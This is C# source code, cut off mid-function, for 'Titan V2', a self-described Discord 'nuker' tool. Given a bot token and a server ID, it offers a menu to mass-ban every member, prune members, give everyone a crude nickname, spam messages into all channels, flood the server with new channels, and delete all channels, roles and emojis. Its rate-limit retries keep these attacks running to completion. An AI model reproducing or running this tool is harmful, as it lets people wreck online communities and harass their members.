using Discord;
using Discord.WebSocket;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Runtime.InteropServices;
using System.Text;


namespace TitanV2
{
    class Program
    {
        static string token = string.Empty;
        static string guildId = string.Empty;
        static HttpClient client = new HttpClient();
        static DiscordSocketClient socketClient = new DiscordSocketClient();
        static string botId = string.Empty;
        static string botUsername = string.Empty;

        public static async Task AnimateTitleLoop(string title, int typingDelay = 50, int holdFullTitleMs = 5000)
        {
            while (true)
            {
                string current = "";

                // Typing effect
                foreach (char c in title)
                {
                    current += c;
                    Console.Title = current;
                    await Task.Delay(typingDelay);
                }

                // Hold full title for 5 seconds
                await Task.Delay(holdFullTitleMs);

                // Optional: clear effect (you can remove this if you want static hold)
                for (int i = current.Length; i > 0; i--)
                {
                    Console.Title = current.Substring(0, i - 1);
                    await Task.Delay(typingDelay / 3);
                }

                await Task.Delay(500); // small delay before next loop
            }
        }
        static async Task Main(string[] args)
        {
            _ = AnimateTitleLoop("TITAN | V2 | @FREAK.FR | [GITHUB.COM/FREAKFR0] TITAN'S DEN");
            if (OperatingSystem.IsWindows())
            {
                Console.SetWindowSize(104, 32);
                Console.SetBufferSize(104, 32);
            }
            ConsoleWindowManager.LockConsoleSize();

            Console.Clear();
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("                                                                         ");
            Console.WriteLine(@"                                  _______ _ _          __      _____   ");
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine(@"                                 |__   __(_) |         \ \    / /__ \ ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine(@"                                    | |   _| |_ __ _ _ _\ \  / /   ) |");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine(@"                                    | |  | | __/ _` | '_ \ \/ /   / / ");
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine(@"                                    | |  | | || (_| | | | \  /   / /_ ");
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine(@"                                    |_|  |_|\__\__,_|_| |_|\/   |____|");
            Console.WriteLine("                                                                       ");
            Console.WriteLine("                                                                       ");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("                                          DEV - @FREAK.FR");
            Console.WriteLine("                                          GIT - GITHUB.COM/FREAKFR0");
            Console.WriteLine("                                          VERSION - 2.0 (V2)");
            Console.WriteLine("                                          SUPPORT - /FREAK");
            Console.WriteLine("                                                                       ");
            Console.WriteLine("                                                                       ");
            Console.ResetColor();

            while (true)
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write("         • TOKEN ► ");
                token = Console.ReadLine()!;

                client.DefaultRequestHeaders.Clear();
                client.DefaultRequestHeaders.Add("Authorization", $"Bot {token}");

                if (!await IsTokenValid())
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("         Invalid Bot Token.");
                    Console.ResetColor();
                    Thread.Sleep(2000);
                    Console.SetCursorPosition(0, Console.CursorTop - 2);
                    Console.Write(new string(' ', Console.WindowWidth));
                    Console.SetCursorPosition(0, Console.CursorTop + 1);
                    Console.Write(new string(' ', Console.WindowWidth));
                    Console.SetCursorPosition(0, Console.CursorTop - 1);
                    continue;
                }

                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write("        • GUILD ID ► ");
                guildId = Console.ReadLine()!;

                if (!await IsBotInGuild())
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("         Invalid Guild ID.");
                    Console.ResetColor();
                    await Task.Delay(2000);
                    Console.SetCursorPosition(0, Console.CursorTop - 3);
                    for (int i = 0; i < 3; i++)
                    {
                        Console.Write(new string(' ', Console.WindowWidth));
                        Console.SetCursorPosition(0, Console.CursorTop + 1);
                    }
                    Console.SetCursorPosition(0, Console.CursorTop - 3);
                    continue;
                }

                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("         Token And Guild ID Are Valid.");
                Console.ResetColor();
                
                var userResponse = await client.GetAsync("https://discord.com/api/v10/users/@me");
                string userJson = await userResponse.Content.ReadAsStringAsync();
                dynamic? userInfo = JsonConvert.DeserializeObject(userJson);

                if (userInfo is not null)
                {
                    botId = userInfo.id;
                    botUsername = userInfo.username;
                    break; // ← Only break if everything succeeded
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("❌ Failed to retrieve bot information. JSON was null.");
                    Console.ResetColor();
                    return; // or loop again / exit depending on your flow
                }
            }

            while (true)
            {
                ShowMenu();
                var choice = Console.ReadLine()?.Trim().ToLower();
                switch (choice)
                {
                    case "1": await ChangeGuildName(); break;
                    case "2": await MassBan(); break;
                    case "3": await UnbanAll(); break;
                    case "4": await PruneMembers(1); break;
                    case "5": await NickAllMembers(); break;
                    case "6": await SpamMSG(); break;
                    case "7": await SpamChannel(); break;
                    case "8": await RenameAllChannels(); break;
                    case "9": await CreateRoleAsync(); break;
                    case "10": await RenameAllRoles(); break;
                    case "11": await ShuffleAllChannels(); break;
                    case "12": await DeleteAllChannels(); break;
                    case "13": await DeleteAllRoles(); break;
                    case "14": await DeleteAllEmojis(); break;
                    case "15": await GetInviteLink(); break;
                    case "16": _ = Task.Run(() => BotIsAwake()); break;
                    case "17": GetBotInviteLink(); break;
                    case "GOD": await GodMode(); break;
                    case "god": await GodMode(); break;
                    case "mod": await GrantEveryoneAdmin(); break;
                    case "MOD": await GrantEveryoneAdmin(); break;
                    case "scan": await ScanGuild(); break;
                    case "SCAN": await ScanGuild(); break;
                    case "exit": return;
                    default: ShowMenu(); break;
                }

                Console.ReadKey();
            }
        }

        static async Task<bool> IsTokenValid()
        {
            var resp = await client.GetAsync("https://discord.com/api/v10/users/@me");
            return resp.IsSuccessStatusCode;

        }

        static async Task<bool> IsBotInGuild()
        {
            var resp = await client.GetAsync("https://discord.com/api/v10/users/@me/guilds");
            if (!resp.IsSuccessStatusCode) return false;

            if (resp.Content == null)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("✘ Response content is null.");
                Console.ResetColor();
                return false;
            }

            string content = await resp.Content.ReadAsStringAsync();
            if (string.IsNullOrEmpty(content))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("✘ Failed to get guild list content.");
                Console.ResetColor();
                return false;
            }

            dynamic? guilds = JsonConvert.DeserializeObject(content);
            if (guilds is null)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("✘ Failed to deserialize guild list.");
                Console.ResetColor();
                return false;
            }

            foreach (var g in guilds)
            {
                if ((string)g.id == guildId)
                    return true;
            }

            JArray? guildsArray = JsonConvert.DeserializeObject<JArray>(content);
            if (guildsArray == null)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("✘ Failed to deserialize guild list.");
                Console.ResetColor();
                return false;
            }

            foreach (var g in guildsArray)
            {
                if ((string?)g["id"] == guildId)
                    return true;
            }
            return false;
        }


        static async Task BotIsAwake()
        {
            socketClient = new DiscordSocketClient(new DiscordSocketConfig
            {
                LogLevel = LogSeverity.Critical
            });

            await socketClient.LoginAsync(TokenType.Bot, token);
            await socketClient.StartAsync();

            await Task.Delay(3000);

            while (true)
            {
                try
                {
                    await socketClient.SetGameAsync("TITAN NUKER BY FREAK", null, ActivityType.Playing);
                }
                catch {}

                await Task.Delay(30000);
            }

        }
        static void ShowMenu()
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine(@"                                                                   ");
            Console.WriteLine(@"                                  _______ _ _          __      _____   ");
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine(@"                                 |__   __(_) |         \ \    / /__ \ ");
                
            Console.WriteLine(@"                                    | |   _| |_ __ _ _ _\ \  / /   ) |");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine(@"                                    | |  | | __/ _` | '_ \ \/ /   / / ");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine(@"                                    | |  | | || (_| | | | \  /   / /_ ");
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine(@"                                    |_|  |_|\__\__,_|_| |_|\/   |____|");
            Console.WriteLine("                                                                              ");
            Console.WriteLine($"                                      Logged In As: [{botUsername}]        ");
            Console.WriteLine($"                                      Bot ID : [{botId}]      ");
            Console.WriteLine($"");
           Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("                          ┌───────═══════════───────┬────────═══════════──────┐");
            Console.WriteLine("                          ║       Version: 2.0      ║        Dev: Freak       ║");
            Console.WriteLine("                          └──────═════─┬─═════──────┴───────═════─┬─═════─────┘");
            Console.WriteLine("                         ┌─────────────┴──────────────────────────┴────────────┐           ");
            Console.WriteLine("           ╔─────────────┴─────────────╦──────────────────────────╦────────────┴────────────╗");
            Console.WriteLine("           ║      Advance Options      ║      Create Options      ║      Delete Options     ║");
            Console.WriteLine("           ╚───────────────────────────╩──────────────────────────╩─────────────────────────╝");
            Console.WriteLine("           │   [01] Change Guild Name  │   [07] Create Channels   │   [12] Delete Channels  │");
            Console.WriteLine("           │   [02] Ban Members        │   [08] Rename Channels   │   [13] Delete Roles     │");
            Console.WriteLine("           │   [03] Unban Members      │   [09] Create Roles      │   [14] Delete Emojis    │");
            Console.WriteLine("           │   [04] Prune Members      │   [10] Rename Roles      ├─────────────────────────┤");
            Console.WriteLine("           │   [05] Nickname Members   │   [11] Shuffle Channels  │   [15] Get Invite Link  │");
            Console.WriteLine("           │   [06] Message Spam       │   [GOD] Allah Hu Akbar   │   [16] Bot Activate     │");
            Console.WriteLine("           │   [SCAN] Guild Info       │   [MOD] All Admin        │   [17] Bot Invite Link  │");
            Console.WriteLine("           ╚═══════════════════════════╩══════════════════════════╩═════════════════════════╝");
            Console.WriteLine("");

            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("•OPTIONS ► ");
            Console.ResetColor();
        }

        
        static async Task ChangeGuildName()
        {
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(@"GUILD NAME ► ");
            Console.ResetColor();
            string? newName = Console.ReadLine();

            if (string.IsNullOrWhiteSpace(newName))
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write($"Guild Name Invalid.");
                Console.ResetColor();
                return;
            }

            var payload = new { name = newName };
            var json = JsonConvert.SerializeObject(payload);
            var content = new StringContent(json, Encoding.UTF8, "application/json");

            try
            {
                var response = await client.PatchAsync($"https://discord.com/api/v10/guilds/{guildId}", content);

                if (response.IsSuccessStatusCode)
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;
                    Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine($"GUILD NAME CHANGED TO: {newName}");
                }
                else
                {
                    var error = await response.Content.ReadAsStringAsync();
                    Console.ForegroundColor = ConsoleColor.DarkRed;
                    Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write($"Failed To Change Guild Name: {error}");
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Error: {ex.Message}");
            }
            finally
            {
                Console.ResetColor();;
            }
        }

        static async Task MassBan()
        {
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(@"REASON(Optional) ► ");
            string? input = Console.ReadLine();
            string reason = input ?? string.Empty;

            var response = await client.GetAsync($"https://discord.com/api/v10/guilds/{guildId}/members?limit=1000");

            if (!response.IsSuccessStatusCode)
            {
                Console.WriteLine($"Failed To Ban: {await response.Content.ReadAsStringAsync()}");
                return;
            }

            var json = await response.Content.ReadAsStringAsync();
            dynamic? members = JsonConvert.DeserializeObject(json);
            if (members == null)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Failed to deserialize member list.");
                Console.ResetColor();
                return;
            }

            int banCount = 0;
            var semaphore = new SemaphoreSlim(3);
            var tasks = new List<Task>();

            foreach (var member in members)
            {
                string userId = member.user.id;
                string username = member.user.username;

                if (string.IsNullOrWhiteSpace(userId))
                    continue;

                tasks.Add(Task.Run(async () =>
                {
                    await semaphore.WaitAsync();
                    try
                    {
                        int retries = 5;

                        while (retries-- > 0)
                        {
                            var banUrl = $"https://discord.com/api/v10/guilds/{guildId}/bans/{userId}";
                            var banPayload = new { reason = reason };
                            var content = new StringContent(JsonConvert.SerializeObject(banPayload), Encoding.UTF8, "application/json");

                            var banResp = await client.PutAsync(banUrl, content);

                            if (banResp.IsSuccessStatusCode)
                            {
                                Console.ForegroundColor = ConsoleColor.DarkRed;
                                Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
                                Console.ForegroundColor = ConsoleColor.White;
                                Console.WriteLine($"Banned: {username} ({userId})");
                                Interlocked.Increment(ref banCount);
                                break;
                            }
                            else if ((int)banResp.StatusCode == 429)
                            {
                                var errorJson = await banResp.Content.ReadAsStringAsync();
                                JObject? errorData = JsonConvert.DeserializeObject<JObject>(errorJson);

                                if (errorData != null && errorData["retry_after"] != null)
                                {
                                    double retryAfterSec = errorData["retry_after"]!.ToObject<double>();
                                    int retryMs = (int)(retryAfterSec * 1000);

                                    Console.ForegroundColor = ConsoleColor.DarkRed;
                                    Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
                                    Console.ForegroundColor = ConsoleColor.White;
                                    Console.Write($"Rate limited banning {username}. Waiting {retryMs}ms...");
                                    await Task.Delay(retryMs);
                                }
                                else
                                {
                                    Console.ForegroundColor = ConsoleColor.DarkRed;
                                    Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
                                    Console.ForegroundColor = ConsoleColor.White;
                                    Console.Write($"Rate limited but retry_after not provided for {username}. Defaulting to 5s...");
                                    Console.ResetColor();
                                    await Task.Delay(5000); // Fallback
                                    break;
                                }
                            }

                        }
                    }
                    finally
                    {
                        semaphore.Release();
                    }
                }));
            }

            await Task.WhenAll(tasks);
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine($"Done! Members Banned: {banCount}");
            Console.ResetColor();
            return;
        }

        static async Task UnbanAll()
        {

            var response = await client.GetAsync($"https://discord.com/api/v10/guilds/{guildId}/bans");

            if (!response.IsSuccessStatusCode)
            {
                Console.WriteLine($"Failed to fetch bans: {await response.Content.ReadAsStringAsync()}");
                return;
            }

            var json = await response.Content.ReadAsStringAsync();
            JArray? bans = JsonConvert.DeserializeObject<JArray>(json);

            if (bans == null)
            {
                Console.WriteLine("No bans found or failed to parse.");
                return;
            }

            int unbanCount = 0;
            var semaphore = new SemaphoreSlim(3); // limit concurrent unbans
            var tasks = new List<Task>();

            foreach (var ban in bans)
            {
                var user = ban["user"];
                string? userId = user?["id"]?.ToString();
                string? username = user?["username"]?.ToString() ?? "Unknown";

                if (string.IsNullOrWhiteSpace(userId))
                    continue;

                tasks.Add(Task.Run(async () =>
                {
                    await semaphore.WaitAsync();
                    try
                    {
                        int retries = 5;
                        while (retries-- > 0)
                        {
                            var unbanUrl = $"https://discord.com/api/v10/guilds/{guildId}/bans/{userId}";
                            var unbanResp = await client.DeleteAsync(unbanUrl);

                            if (unbanResp.IsSuccessStatusCode)
                            {
                                Console.ForegroundColor = ConsoleColor.DarkRed;
                                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                                Console.ForegroundColor = ConsoleColor.White;
                                Console.WriteLine($"Unbanned: {username} ({userId})");
                                Interlocked.Increment(ref unbanCount);
                                break;
                            }
                            else if ((int)unbanResp.StatusCode == 429)
                            {
                                var errorJson = await unbanResp.Content.ReadAsStringAsync();
                                dynamic? errorData = JsonConvert.DeserializeObject<dynamic>(errorJson);

                                double? retryAfterSec = errorData?.retry_after;
                                int retryMs = (int)((retryAfterSec ?? 1.0) * 1000);
                                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] Rate limited unbanning {username}. Waiting {retryMs}ms...");
                                await Task.Delay(retryMs);
                                break;
                            }
                        }
                    }
                    finally
                    {
                        semaphore.Release();
                    }
                }));
            }

            await Task.WhenAll(tasks);
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine($"Done! Members Unbanned: {unbanCount}");
            return;
        }

        static async Task PruneMembers(int days = 1)
        {
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine($"Estimating members inactive for {days} day(s)...");

            var previewResponse = await client.GetAsync($"https://discord.com/api/v10/guilds/{guildId}/prune?days={days}");
            if (!previewResponse.IsSuccessStatusCode)
            {
                Console.WriteLine($"Failed to preview prune: {await previewResponse.Content.ReadAsStringAsync()}");
                return;
            }

            var json = await previewResponse.Content.ReadAsStringAsync();
            var preview = JsonConvert.DeserializeObject<JObject>(json);
            int pruneCount = preview?["pruned"]?.Value<int>() ?? 0;

            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine($"Estimated members to be pruned: {pruneCount}");
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("Proceed with pruning? (y/n): ");
            var confirm = Console.ReadLine();

            if (confirm?.ToLower() != "y")
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine($"Prune cancelled.");
                Console.ResetColor();
                return;
            }

            var payload = new { days = days };
            var content = new StringContent(JsonConvert.SerializeObject(payload), Encoding.UTF8, "application/json");

            var pruneResponse = await client.PostAsync($"https://discord.com/api/v10/guilds/{guildId}/prune", content);
            if (pruneResponse.IsSuccessStatusCode)
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine($"Success! Members pruned: {pruneCount}");
                return;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine($"Failed to prune: {await pruneResponse.Content.ReadAsStringAsync()}");
                return;
            }
        }

        static async Task NickAllMembers()
        {
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(@"NICK NAME: ");
            Console.ResetColor();
            string newNickname = Console.ReadLine() ?? "Freak Fucked Me";

            var response = await client.GetAsync($"https://discord.com/api/v10/guilds/{guildId}/members?limit=1000");

            if (!response.IsSuccessStatusCode)
            {
                Console.WriteLine($"Failed to fetch members: {await response.Content.ReadAsStringAsync()}");
                return;
            }

            var json = await response.Content.ReadAsStringAsync();
            dynamic? members = JsonConvert.DeserializeObject(json);
            if (members == null)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Failed to parse member list.");
                Console.ResetColor();
                return;
            }

            var semaphore = new SemaphoreSlim(10); // Up to 10 nickname changes in parallel
            var tasks = new List<Task>();
            int nicked = 0;

            foreach (var member in members)
            {
                string userId = member.user.id;
                string username = member.user.username;

                if (string.IsNullOrWhiteSpace(userId))
                    continue;

                tasks.Add(Task.Run(async () =>
                {
                    await semaphore.WaitAsync();
                    try
                    {
                        var url = $"https://discord.com/api/v10/guilds/{guildId}/members/{userId}";
                        var payload = new { nick = newNickname };
                        var content = new StringContent(JsonConvert.SerializeObject(payload), Encoding.UTF8, "application/json");

                        var patch = new HttpRequestMessage(new HttpMethod("PATCH"), url) { Content = content };
                        var result = await client.SendAsync(patch);

                        if (result.IsSuccessStatusCode)
                        {
                            Console.ForegroundColor = ConsoleColor.DarkRed;
                            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                            Console.ForegroundColor = ConsoleColor.White;
                            Console.WriteLine($"Nicknamed: {username}");
                            Interlocked.Increment(ref nicked);
                        }
                        else if ((int)result.StatusCode == 429)
                        {
                            dynamic? err = JsonConvert.DeserializeObject(await result.Content.ReadAsStringAsync());
                            double retry = err?.retry_after ?? 1.0;
                            await Task.Delay((int)(retry * 1000));
                        }
                    }
                    catch { }
                    finally
                    {
                        semaphore.Release();
                    }
                }));
            }

            await Task.WhenAll(tasks);

            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine($"Done! Nicked members: {nicked}");
            Console.ResetColor();
            return;
        }

        static async Task SpamMSG()
        {
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("YOUR MESSAGE: ");
            var message = Console.ReadLine();

            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("HOW MANY TIMES PER CHANNEL: ");
            if (!int.TryParse(Console.ReadLine(), out int repeatCount) || repeatCount <= 0)
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("Invalid number, defaulting to 1.");
                repeatCount = 1;
            }

            var response = await client.GetAsync($"https://discord.com/api/v10/guilds/{guildId}/channels");

            if (!response.IsSuccessStatusCode)
            {
                string errorText = await response.Content.ReadAsStringAsync();

                lock (Console.Out)
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;
                    Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine("Failed to fetch channels: " + errorText);
                }
                return;
            }

            var json = await response.Content.ReadAsStringAsync();
            dynamic? channels = JsonConvert.DeserializeObject(json);

            if (channels == null)
            {
                lock (Console.Out)
                {
                    Console.ForegroundColor = ConsoleColor.DarkRed;
                    Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine("Failed to parse channel list.");
                }
                return;
            }

            var tasks = new List<Task>();
            int sentCount = 0;

            foreach (var channel in channels)
            {
                string channelId = channel.id;
                int type = channel.type;

                if (type != 0 && type != 5)
                    continue;

                tasks.Add(Task.Run(async () =>
                {
                    for (int i = 0; i < repeatCount; i++)
                    {
                        var payload = new { content = message };
                        var content = new StringContent(JsonConvert.SerializeObject(payload), Encoding.UTF8, "application/json");

                        HttpResponseMessage postResponse = await client.PostAsync($"https://discord.com/api/v10/channels/{channelId}/messages", content);

                        if (postResponse.StatusCode == System.Net.HttpStatusCode.TooManyRequests)
                        {
                            var body = await postResponse.Content.ReadAsStringAsync();
                            dynamic? rateLimit = JsonConvert.DeserializeObject(body);
                            int delay = (int)(rateLimit?["retry_after"] ?? 1000);
                            await Task.Delay(delay);
                            i--; // retry same message
                            continue;
                        }

                        if (postResponse.IsSuccessStatusCode)
                        {
                            lock (Console.Out)
                            {
                                Console.ForegroundColor = ConsoleColor.DarkRed;
                                Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
                                Console.ForegroundColor = ConsoleColor.White;
                                Console.WriteLine($"({message}) to ({channelId})");
                            }
                            Interlocked.Increment(ref sentCount);
                        }
                    }
                }));
            }

            await Task.WhenAll(tasks);

            lock (Console.Out)
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine($"Finished. Total messages sent: {sentCount}");
            }
        }

        static async Task SpamChannel()
        {
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("CHANNEL NAME: ");
            Console.ResetColor();
            var name = Console.ReadLine();

            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("HOW MUCH: ");
            Console.ResetColor();

            if (!int.TryParse(Console.ReadLine(), out int count) || count <= 0)
            {
                Console.WriteLine("Invalid Number.");
                return;
            }

            var payload = new { name = name, type = 0 };
            string jsonPayload = JsonConvert.SerializeObject(payload);
            var contentBytes = Encoding.UTF8.GetBytes(jsonPayload);
            var tasks = new List<Task>();
            var throttle = new SemaphoreSlim(10); // Increase to 10 threads
            int success = 0;

            for (int i = 0; i < count; i++)
            {
                int index = i + 1;
                tasks.Add(Task.Run(async () =>
                {
                    await throttle.WaitAsync();
                    try
                    {
                        using var content = new ByteArrayContent(contentBytes);
                        content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/json");

                        var response = await client.PostAsync(
                            $"https://discord.com/api/v10/guilds/{guildId}/channels",
                            content
                        );

                        if (response.IsSuccessStatusCode)
                        {
                            Interlocked.Increment(ref success);
                            Console.ForegroundColor = ConsoleColor.DarkRed;
                            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                            Console.ForegroundColor = ConsoleColor.White;
                            Console.WriteLine($"Created: {name} No.{index}");
                        }
                        else
                        {
                            string error = await response.Content.ReadAsStringAsync();
                            if (!error.Contains("Missing Permissions"))
                            {
                                Console.ForegroundColor = ConsoleColor.DarkRed;
                                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                                Console.ForegroundColor = ConsoleColor.White;
                                Console.WriteLine($"Failed {index}: {response.StatusCode} → {error}");
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.ForegroundColor = ConsoleColor.DarkRed;
                        Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine($"Error #{index}: {ex.Message}");
                    }
                    finally
                    {
                        Console.ResetColor();
                        throttle.Release();
                    }
                }));
            }

            await Task.WhenAll(tasks);

            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine($"Completed → Created: {count}");
            Console.ResetColor();
            return;
        }

        static async Task RenameAllChannels()
        {
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.Write(DateTime.Now.ToString("[HH:mm:ss]") + " ");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(@"NEW NAME: ");
            Console.ResetColor();
            string? newName = Console.ReadLine();

            var response = await client.GetAsync($"https://discord.com/api/v10/guilds/{guildId}/channels");

            if (!response.IsSuccessStatusCode)
            {
                Console.WriteLine($"Failed to fetch channels: {await response.Content.ReadAsStringAsync()}");
                return;
            }

            var json = await response.Content.ReadAsStringAsync();
            dynamic? channels = JsonConvert.DeserializeObject(json);

            var semaphore = new SemaphoreSlim(5); // max 5 parallel renames
            var tasks = new List<Task>();
            int renamed = 0;

            if (channels == null)
            {
                Console.WriteLine("Failed to deserialize channels.");
                return;
            }

            foreach (var channel in channels)
            {
                string id = channel.id;
                string type = channel.type;

                // Skip categories (type 4) and stage/news threads (you can customize this)
                if (type == "4" || type == "10" || type == "11" || type == "12") continue;

                tasks.Add(Task.Run(async () =>
                {
                    await semaphore.WaitAsync();
                    try
                    {
                        int retries = 5;
                        while (retries-- > 0)
                        {
                            var url = $"https://discord.com/api/v10/channels/{id}";
                            var payload = new { name = newName };
                            var content = new StringContent(JsonConvert.SerializeObject(payload), Encoding.UTF8, "application/json");
                            var request = new HttpRequestMessage(new HttpMethod("PATCH"), url)
                            {
                                Content = content
                            };

                            var result = await client.SendAsync(request);

                            if (result.IsSuccessStatusCode)
                            {
                                Interlocked.Increment(ref renamed);
                                Console.ForegroundColor = ConsoleColor.DarkRed;
                                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                                Console.ForegroundColor = ConsoleColor.White;
                                Console.WriteLine($"Renamed channel ID {id}");
                                break;
                            }
                            else if ((int)result.StatusCode == 429)
                            {
                                string contentString = "{}"; // fallback in case of null
                                if (result?.Content != null)
                                {
                                    contentString = await result.Content.ReadAsStringAsync();
                                }

                                var err = JObject.Parse(contentString);
                                double retryAfter = err["retry_after"]?.Value<double>() ?? 1.0;
                                Console.ForegroundColor = ConsoleColor.DarkRed;
                                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                                Console.ForegroundColor = ConsoleColor.White;
                                Console.WriteLine($"Rate limit hit on {id}, waiting {retryAfter * 1000}ms...");
                                await Task.Delay((int)(retryAfter * 1000));
                            }
                            else
                            {
                                Console.ForegroundColor = ConsoleColor.DarkRed;
                                Console.Write($"[{DateTime.Now:HH:mm:ss}] ");
                                Console.ForegroundColor = ConsoleColor.White;
                                Console.WriteLine($"Failed to rename {id}: {await result.Content.ReadAsStringAsync()}");
